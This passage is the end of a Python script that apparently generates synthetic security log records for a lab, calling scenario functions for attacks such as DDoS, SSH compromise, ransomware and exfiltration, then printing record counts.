# ---------------------------------------------------------------------------

def generate(seed: int = 20261031) -> dict:
    lab = Lab(seed=seed)
    baseline(lab)
    scenario_ddos_and_stuffing(lab)
    scenario_recon_web_attack(lab)
    scenario_ssh_compromise(lab)
    scenario_phishing_malware(lab)
    scenario_ransomware(lab)
    scenario_exfiltration_and_rdp(lab)
    return lab.write()


def main() -> None:
    manifest = generate()
    total = sum(manifest["counts"].values())
    print(f"generated {total} raw log records in {LOG_DIR.relative_to(ROOT)}")
    for name, count in manifest["counts"].items():
        print(f"  {name:>18}: {count}")


if __name__ == "__main__":
    main()
